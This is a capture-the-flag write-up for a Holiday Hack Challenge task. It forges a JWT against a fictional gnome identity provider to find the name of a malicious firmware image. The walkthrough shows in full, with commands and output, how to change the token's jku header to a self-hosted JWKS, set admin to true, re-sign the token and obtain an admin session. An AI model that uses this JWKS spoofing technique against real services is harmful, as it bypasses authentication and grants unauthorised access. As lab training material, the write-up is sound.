# TASK 15 - Rogue Gnome Identity Provider
Difficulty: ❄️❄️

[Direct Link](https://hhc25-wetty-prod.holidayhackchallenge.com/?&challenge=termRogueGnome)

## OBJECTIVE : ##
>Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?


## HINTS: ##
<details>
  <summary>Hints provided for Task 15</summary>
  
>-	If you need to host any files for the attack, the server is running a webserver available locally at http://paulweb.neighborhood/ . The files for the site are stored in ~/www
>-  https://github.com/ticarpi/jwt_tool/wiki and https://portswigger.net/web-security/jwt have some great information on analyzing JWT's and performing JWT attacks.
>-  It looks like the JWT uses JWKS. Maybe a JWKS spoofing attack would work.

</details>
 
#

## PROCEDURE : ##

Paul Beckett tells us that he has access to Gnome's Diagnostic Interface at `gnome-48371.atnascorp` with the low-privelege account credentials `gnome:SittingOnAShelf`, and that we need to find a way to get admin access to see what the gnomes are up to.

```bash
paul@paulweb:~$ cat notes 
# Sites

## Captured Gnome:
curl http://gnome-48371.atnascorp/

## ATNAS Identity Provider (IdP):
curl http://idp.atnascorp/

## My CyberChef website:
curl http://paulweb.neighborhood/
### My CyberChef site html files:
~/www/


# Credentials

## Gnome credentials (found on a post-it):
Gnome:SittingOnAShelf


# Curl Commands Used in Analysis of Gnome:

## Gnome Diagnostic Interface authentication required page:
curl http://gnome-48371.atnascorp

## Request IDP Login Page
curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth

## Authenticate to IDP
curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login

## Pass Auth Token to Gnome
curl -v http://gnome-48371.atnascorp/auth?token=<insert-JWT>

## Access Gnome Diagnostic Interface
curl -H 'Cookie: session=<insert-session>' http://gnome-48371.atnascorp/diagnostic-interface

## Analyze the JWT
jwt_tool.py <insert-JWT>
```

let's try some of the commands found inside the `notes`:

```bash
paul@paulweb:~$ curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1MTgzOCwiZXhwIjoxNzYzNTU5MDM4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.IT8bG14_uxu1WNfcXEpFEaQU0QvocL25YKdcSCVkcLypA73FNzea2bog5V0hQu70rCDD-ux-ViuJRY0ZKLunqPItnoT43R1PerRBR18qZU8u1LEbyJCiKrth6wtolrZDY0Zf0gDBEEs4u5_r1crDzx9tt533Oe2P2daKmkdqfQtQeOX7OJecGwGOe-djTKnO9xPt2jksV-Rg7rYZefoB--ukwRxFSs3f6mogDCFMhtayCeYvT7iFZRlrX4EWh1YuC6ViGkJz2wL4PXu3JKIdY-kkBDfoZ9UVzrKl160KKUjvTVdKALGv0b7N-JyWAlqfuU6NRz88Agetk0yyoLD-4Q">http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1MTgzOCwiZXhwIjoxNzYzNTU5MDM4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.IT8bG14_uxu1WNfcXEpFEaQU0QvocL25YKdcSCVkcLypA73FNzea2bog5V0hQu70rCDD-ux-ViuJRY0ZKLunqPItnoT43R1PerRBR18qZU8u1LEbyJCiKrth6wtolrZDY0Zf0gDBEEs4u5_r1crDzx9tt533Oe2P2daKmkdqfQtQeOX7OJecGwGOe-djTKnO9xPt2jksV-Rg7rYZefoB--ukwRxFSs3f6mogDCFMhtayCeYvT7iFZRlrX4EWh1YuC6ViGkJz2wL4PXu3JKIdY-kkBDfoZ9UVzrKl160KKUjvTVdKALGv0b7N-JyWAlqfuU6NRz88Agetk0yyoLD-4Q</a>. If not, click the link.
```

This gives us a token with the value `eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1MTgzOCwiZXhwIjoxNzYzNTU5MDM4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.IT8bG14_uxu1WNfcXEpFEaQU0QvocL25YKdcSCVkcLypA73FNzea2bog5V0hQu70rCDD-ux-ViuJRY0ZKLunqPItnoT43R1PerRBR18qZU8u1LEbyJCiKrth6wtolrZDY0Zf0gDBEEs4u5_r1crDzx9tt533Oe2P2daKmkdqfQtQeOX7OJecGwGOe-djTKnO9xPt2jksV-Rg7rYZefoB--ukwRxFSs3f6mogDCFMhtayCeYvT7iFZRlrX4EWh1YuC6ViGkJz2wL4PXu3JKIdY-kkBDfoZ9UVzrKl160KKUjvTVdKALGv0b7N-JyWAlqfuU6NRz88Agetk0yyoLD-4Q`

We can try passing on this token now:
```bash
paul@paulweb:~$ curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1MTgzOCwiZXhwIjoxNzYzNTU5MDM4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.IT8bG14_uxu1WNfcXEpFEaQU0QvocL25YKdcSCVkcLypA73FNzea2bog5V0hQu70rCDD-ux-ViuJRY0ZKLunqPItnoT43R1PerRBR18qZU8u1LEbyJCiKrth6wtolrZDY0Zf0gDBEEs4u5_r1crDzx9tt533Oe2P2daKmkdqfQtQeOX7OJecGwGOe-djTKnO9xPt2jksV-Rg7rYZefoB--ukwRxFSs3f6mogDCFMhtayCeYvT7iFZRlrX4EWh1YuC6ViGkJz2wL4PXu3JKIdY-kkBDfoZ9UVzrKl160KKUjvTVdKALGv0b7N-JyWAlqfuU6NRz88Agetk0yyoLD-4Q
* Host gnome-48371.atnascorp:80 was resolved.
* IPv6: (none)
* IPv4: 127.0.0.1
*   Trying 127.0.0.1:80...
* Connected to gnome-48371.atnascorp (127.0.0.1) port 80
> GET /auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1MTgzOCwiZXhwIjoxNzYzNTU5MDM4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.IT8bG14_uxu1WNfcXEpFEaQU0QvocL25YKdcSCVkcLypA73FNzea2bog5V0hQu70rCDD-ux-ViuJRY0ZKLunqPItnoT43R1PerRBR18qZU8u1LEbyJCiKrth6wtolrZDY0Zf0gDBEEs4u5_r1crDzx9tt533Oe2P2daKmkdqfQtQeOX7OJecGwGOe-djTKnO9xPt2jksV-Rg7rYZefoB--ukwRxFSs3f6mogDCFMhtayCeYvT7iFZRlrX4EWh1YuC6ViGkJz2wL4PXu3JKIdY-kkBDfoZ9UVzrKl160KKUjvTVdKALGv0b7N-JyWAlqfuU6NRz88Agetk0yyoLD-4Q HTTP/1.1
> Host: gnome-48371.atnascorp
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 302 FOUND
< Date: Wed, 19 Nov 2025 11:32:11 GMT
< Server: Werkzeug/3.0.1 Python/3.12.3
< Content-Type: text/html; charset=utf-8
< Content-Length: 229
< Location: /diagnostic-interface
< Vary: Cookie
< Set-Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aR2quw.v4RpvefHyroqQqTVBAV652uP0WQ; HttpOnly; Path=/
< 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/diagnostic-interface">/diagnostic-interface</a>. If not, click the link.
* Connection #0 to host gnome-48371.atnascorp left intact
```

Great - we now have a session cookie, which we can use to log in by passing on it's value in the header:
```bash
paul@paulweb:~$ curl -H 'Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aR2quw.v4RpvefHyroqQqTVBAV652uP0WQ' http://gnome-48371.atnascorp/diagnostic-interface

<!DOCTYPE html>
<html>
<head>
    <title>AtnasCorp : Gnome Diagnostic Interface</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
<h1>AtnasCorp : Gnome Diagnostic Interface</h1>
<p>Welcome gnome</p><p>Diagnostic access is only available to admins.</p>

</body>
```

As expected - we cannot get any further since diagnostic access is only available to admins.  There must be some way of altering the JWT token we were given earlier to get a session cookie for an admin login.

Conveniently the terminal comes with `jwt_tool.py` already installed and the `notes` document also tells us to how to use it.  We can pass on the value of the JWT token we found earlier to `jwt_tool.py` to analyse it (Alternatively you can also use an online tool like [jwt.io](jwt.io))
```bash
paul@paulweb:~$ jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1MTgzOCwiZXhwIjoxNzYzNTU5MDM4LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.IT8bG14_uxu1WNfcXEpFEaQU0QvocL25YKdcSCVkcLypA73FNzea2bog5V0hQu70rCDD-ux-ViuJRY0ZKLunqPItnoT43R1PerRBR18qZU8u1LEbyJCiKrth6wtolrZDY0Zf0gDBEEs4u5_r1crDzx9tt533Oe2P2daKmkdqfQtQeOX7OJecGwGOe-djTKnO9xPt2jksV-Rg7rYZefoB--ukwRxFSs3f6mogDCFMhtayCeYvT7iFZRlrX4EWh1YuC6ViGkJz2wL4PXu3JKIdY-kkBDfoZ9UVzrKl160KKUjvTVdKALGv0b7N-JyWAlqfuU6NRz88Agetk0yyoLD-4Q

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.3.0                \______|             @ticarpi      

/home/paul/.jwt_tool/jwtconf.ini
Original JWT: 

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "RS256"
[+] jku = "http://idp.atnascorp/.well-known/jwks.json"
[+] kid = "idp-key-2025"
[+] typ = "JWT"

Token payload values:
[+] sub = "gnome"
[+] iat = 1763551838    ==> TIMESTAMP = 2025-11-19 11:30:38 (UTC)
[+] exp = 1763559038    ==> TIMESTAMP = 2025-11-19 13:30:38 (UTC)
[+] iss = "http://idp.atnascorp/"
[+] admin = False

Seen timestamps:
[*] iat was seen
[*] exp is later than iat by: 0 days, 2 hours, 0 mins

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```



<img width="1258" height="794" alt="image" src="https://github.com/user-attachments/assets/51709adc-f0c9-4028-9906-871710214daa" />


1. analyse existing token

2. edit the token and sign it using rsa256

3. generate a jwks.json file using https://www.authgear.com/tools/jwk-generator

4. use the newly generated token to get a new session cookie

   ```
   paul@paulweb:~$ jwt_tool.py -T $TOKEN -S rs256

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.3.0                \______|             @ticarpi      

/home/paul/.jwt_tool/jwtconf.ini
Original JWT: 


====================================================================
This option allows you to tamper with the header, contents and 
signature of the JWT.
====================================================================

Token header values:
[1] alg = "RS256"
[2] jku = "http://idp.atnascorp/.well-known/jwks.json"
[3] kid = "idp-key-2025"
[4] typ = "JWT"
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 2

Current value of jku is: http://idp.atnascorp/.well-known/jwks.json
Please enter new value and hit ENTER
> http://paulweb.neighborhood/custom-jwks.json
[1] alg = "RS256"
[2] jku = "http://paulweb.neighborhood/custom-jwks.json"
[3] kid = "idp-key-2025"
[4] typ = "JWT"
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] sub = "gnome"
[2] iat = 1763558897    ==> TIMESTAMP = 2025-11-19 13:28:17 (UTC)
[3] exp = 1763566097    ==> TIMESTAMP = 2025-11-19 15:28:17 (UTC)
[4] iss = "http://idp.atnascorp/"
[5] admin = False
[6] *ADD A VALUE*
[7] *DELETE A VALUE*
[8] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 5

Current value of admin is: False
Please enter new value and hit ENTER
> True
[1] sub = "gnome"
[2] iat = 1763558897    ==> TIMESTAMP = 2025-11-19 13:28:17 (UTC)
[3] exp = 1763566097    ==> TIMESTAMP = 2025-11-19 15:28:17 (UTC)
[4] iss = "http://idp.atnascorp/"
[5] admin = True
[6] *ADD A VALUE*
[7] *DELETE A VALUE*
[8] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
jwttool_3d3a37d3cb702277e6dded5f4b7989b2 - Tampered token - RSA Signing:
[+] eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9jdXN0b20tandrcy5qc29uIiwia2lkIjoiaWRwLWtleS0yMDI1IiwidHlwIjoiSldUIn0.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1ODg5NywiZXhwIjoxNzYzNTY2MDk3LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.ldbZLQJQa6dJ0hZv86NiCYoq40RqlK0BBUQzZBglu-Pfd1NnzIGZZnDzz1j-viUYWjsb9pNyaWzOAVYHtRkgQfJSjLEIwAAGfhoaQVJ3_omhpOZGZFFFCoT9JPUug6tL9Br9es974WO9IsqAoQYI1XY3QFLMTys8gFUUSDNLbxtdshmhs1WqonxOrcc5ADGh9RwuqmDfgTeIXQPVggsEQ14LXBDMtYcgQEdn9_fnq8uWpHl8lmLk6UQJY_hiwZsTIqFlX-SJmOo6bWl7eiWt-rXWk9fpSZgf8QKW-RF_OLJmdfean0kshyP7e20tTdK3I-SwsfEx8P6_6ktQyT-xZQ
paul@paulweb:~$ NEWTOKEN=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9jdXN0b20tandrcy5qc29uIiwia2lkIjoiaWRwLWtleS0yMDI1IiwidHlwIjoiSldUIn0.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1ODg5NywiZXhwIjoxNzYzNTY2MDk3LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.ldbZLQJQa6dJ0hZv86NiCYoq40RqlK0BBUQzZBglu-Pfd1NnzIGZZnDzz1j-viUYWjsb9pNyaWzOAVYHtRkgQfJSjLEIwAAGfhoaQVJ3_omhpOZGZFFFCoT9JPUug6tL9Br9es974WO9IsqAoQYI1XY3QFLMTys8gFUUSDNLbxtdshmhs1WqonxOrcc5ADGh9RwuqmDfgTeIXQPVggsEQ14LXBDMtYcgQEdn9_fnq8uWpHl8lmLk6UQJY_hiwZsTIqFlX-SJmOo6bWl7eiWt-rXWk9fpSZgf8QKW-RF_OLJmdfean0kshyP7e20tTdK3I-SwsfEx8P6_6ktQyT-xZQ
paul@paulweb:~$ jwt_tool.py $NEWTOKEN -V -jw www/custom-jwks.json 

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.3.0                \______|             @ticarpi      

/home/paul/.jwt_tool/jwtconf.ini
Original JWT: 

JWKS Contents:
Number of keys: 1

--------
Key 1
kid: idp-key-2025
[+] kty = RSA
[+] kid = idp-key-2025
[+] use = sig
[+] e = AQAB
[+] n = tchOVdXUg9T_HV2f9TVZeoH3G2uB243yAa6Hh7RsyeOy1tAs-OEnD1_5TWrljY-RqoSfoEjbE38rtVLp_weDfroHn8I-I9lGuAA-wDI70sOTm4tSSDuwD9VBFmXI-dFwsTN446yRJagaZP4ZgfPoreOL9bpfL_7HxPOJZ14z2ZJZaP-7hr1HSasyTkkRG3u4pylgoRUu2ZUxWhqNg1A7e1YNUrtlqagooFxGYkZBXbBXJbHdMLn-PSs3tc3pWQEQHPAYBSFHnCzyTEOFQOixh-OQq3KyL5sHKvOWUhTyO2USOmJHLYUbCEd6_DfrcR4P5EctwTlTEU1ssXONGgxHAQ

Found RSA key factors, generating a public key
[+] kid_idp-key-2025_1763562509.pem

Attempting to verify token using kid_idp-key-2025_1763562509.pem
RSA Signature is VALID
paul@paulweb:~$ curl -v http://gnome-48371.atnascorp/auth?token=$NEWTOKEN
* Host gnome-48371.atnascorp:80 was resolved.
* IPv6: (none)
* IPv4: 127.0.0.1
*   Trying 127.0.0.1:80...
* Connected to gnome-48371.atnascorp (127.0.0.1) port 80
> GET /auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9jdXN0b20tandrcy5qc29uIiwia2lkIjoiaWRwLWtleS0yMDI1IiwidHlwIjoiSldUIn0.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1ODg5NywiZXhwIjoxNzYzNTY2MDk3LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.ldbZLQJQa6dJ0hZv86NiCYoq40RqlK0BBUQzZBglu-Pfd1NnzIGZZnDzz1j-viUYWjsb9pNyaWzOAVYHtRkgQfJSjLEIwAAGfhoaQVJ3_omhpOZGZFFFCoT9JPUug6tL9Br9es974WO9IsqAoQYI1XY3QFLMTys8gFUUSDNLbxtdshmhs1WqonxOrcc5ADGh9RwuqmDfgTeIXQPVggsEQ14LXBDMtYcgQEdn9_fnq8uWpHl8lmLk6UQJY_hiwZsTIqFlX-SJmOo6bWl7eiWt-rXWk9fpSZgf8QKW-RF_OLJmdfean0kshyP7e20tTdK3I-SwsfEx8P6_6ktQyT-xZQ HTTP/1.1
> Host: gnome-48371.atnascorp
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 302 FOUND
< Date: Wed, 19 Nov 2025 14:28:41 GMT
< Server: Werkzeug/3.0.1 Python/3.12.3
< Content-Type: text/html; charset=utf-8
< Content-Length: 229
< Location: /diagnostic-interface
< Vary: Cookie
< Set-Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aR3UGQ.IKBsh1vLJH9lJHUEjPBwCpAz-B4; HttpOnly; Path=/
< 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/diagnostic-interface">/diagnostic-interface</a>. If not, click the link.
* Connection #0 to host gnome-48371.atnascorp left intact
```



paul@paulweb:~$ curl -v http://gnome-48371.atnascorp/auth?token=$NEWTOKEN
* Host gnome-48371.atnascorp:80 was resolved.
* IPv6: (none)
* IPv4: 127.0.0.1
*   Trying 127.0.0.1:80...
* Connected to gnome-48371.atnascorp (127.0.0.1) port 80
> GET /auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9jdXN0b20tandrcy5qc29uIiwia2lkIjoiaWRwLWtleS0yMDI1IiwidHlwIjoiSldUIn0.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzU1ODg5NywiZXhwIjoxNzYzNTY2MDk3LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.ldbZLQJQa6dJ0hZv86NiCYoq40RqlK0BBUQzZBglu-Pfd1NnzIGZZnDzz1j-viUYWjsb9pNyaWzOAVYHtRkgQfJSjLEIwAAGfhoaQVJ3_omhpOZGZFFFCoT9JPUug6tL9Br9es974WO9IsqAoQYI1XY3QFLMTys8gFUUSDNLbxtdshmhs1WqonxOrcc5ADGh9RwuqmDfgTeIXQPVggsEQ14LXBDMtYcgQEdn9_fnq8uWpHl8lmLk6UQJY_hiwZsTIqFlX-SJmOo6bWl7eiWt-rXWk9fpSZgf8QKW-RF_OLJmdfean0kshyP7e20tTdK3I-SwsfEx8P6_6ktQyT-xZQ HTTP/1.1
> Host: gnome-48371.atnascorp
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 302 FOUND
< Date: Wed, 19 Nov 2025 14:37:54 GMT
< Server: Werkzeug/3.0.1 Python/3.12.3
< Content-Type: text/html; charset=utf-8
< Content-Length: 229
< Location: /diagnostic-interface
< Vary: Cookie
< Set-Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aR3WQg.4rlv-ZRlOiX5bZMJscURH-lfjww; HttpOnly; Path=/
< 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/diagnostic-interface">/diagnostic-interface</a>. If not, click the link.
* Connection #0 to host gnome-48371.atnascorp left intact
```

```
paul@paulweb:~$ curl -H 'Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aR3WQg.4rlv-ZRlOiX5bZMJscURH-lfjww' http://gnome-48371.atnascorp/diagnostic-interface

<!DOCTYPE html>
<html>
<head>
    <title>AtnasCorp : Gnome Diagnostic Interface</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
<h1>AtnasCorp : Gnome Diagnostic Interface</h1>
<div style='display:flex; justify-content:center; gap:10px;'>
<img src='/camera-feed' style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0;' />
<div style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0; display:flex; align-items:flex-start; justify-content:flex-start; text-align:left;'>
System Log<br/>
2025-11-19 04:53:07: Movement detected.<br/>
2025-11-19 13:21:18: AtnasCorp C&C connection restored.<br/>
2025-11-19 14:31:53: Checking for updates.<br/>
2025-11-19 14:31:53: Firmware Update available: refrigeration-botnet.bin<br/>
2025-11-19 14:31:55: Firmware update downloaded.<br/>
2025-11-19 14:31:55: Gnome will reboot to apply firmware update in one hour.</div>
</div>
<div class="statuscheck">
    <div class="status-container">
        <div class="status-item">
            <div class="status-indicator active"></div>
            <span>Live Camera Feed</span>
        </div>
        <div class="status-item">
            <div class="status-indicator active"></div>
            <span>Network Connection</span>
        </div>
        <div class="status-item">
            <div class="status-indicator active"></div>
            <span>Connectivity to Atnas C&C</span>
        </div>
    </div>
</div>

</body>
</html>
```

<img width="847" height="448" alt="image" src="https://github.com/user-attachments/assets/df832d1a-6864-4f2b-9fb8-dd0337c8d252" />

